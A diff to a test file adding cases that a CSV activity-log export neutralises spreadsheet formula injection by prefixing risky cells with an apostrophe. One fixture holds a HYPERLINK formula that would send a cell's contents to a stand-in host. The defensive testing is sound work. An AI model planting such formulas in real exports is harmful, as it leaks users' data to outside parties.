@@ -35,6 +35,24 @@ describe('the CSV', () => {
     expect(csv.split('\r\n')[1]).toBe('2026-10-23 21:05:09,Left the group,"Rao, ""Ravi""",u,,');
   });
 
+  // A name is whatever a member typed. A spreadsheet reads a cell that starts with = + - @ (or a
+  // tab or return) as a formula, quoted or not, so those get a leading apostrophe and stay text.
+  it('keeps a name, id or admin name that starts like a formula as plain text', () => {
+    const csv = activityLogCsv([
+      { at, kind: 'left-group', uid: '+1+1', name: '=HYPERLINK("http://x.invalid/?"&D2,"x")', byName: '@SUM(1)', byUid: '-2' },
+      { at: at + 1000, kind: 'left-group', uid: 'u', name: '\tTab', byName: '\rReturn' },
+    ]);
+    const lines = csv.split('\r\n');
+    expect(lines[1]).toBe(`2026-10-23 21:05:09,Left the group,"'=HYPERLINK(""http://x.invalid/?""&D2,""x"")",'+1+1,'@SUM(1),'-2`);
+    expect(lines[2].startsWith("2026-10-23 21:05:10,Left the group,'\tTab,u,")).toBe(true);
+    expect(csv).toContain(`"'\rReturn"`);
+  });
+
+  it('leaves an ordinary name, and the time and event columns, exactly as they were', () => {
+    const csv = activityLogCsv([{ at, kind: 'left-group', uid: 'u-1', name: 'Ravi K. (2nd yr)', byName: 'Alpha' }]);
+    expect(csv.split('\r\n')[1]).toBe('2026-10-23 21:05:09,Left the group,Ravi K. (2nd yr),u-1,Alpha,');
+  });
+
   it('is named for the group and the day, with nothing a path could hide in', () => {
     expect(activityLogFileName('AB-12/..', at)).toBe('locus-activity-AB12-2026-10-23.csv');
     expect(localTime(at)).toBe('2026-10-23 21:05:09');
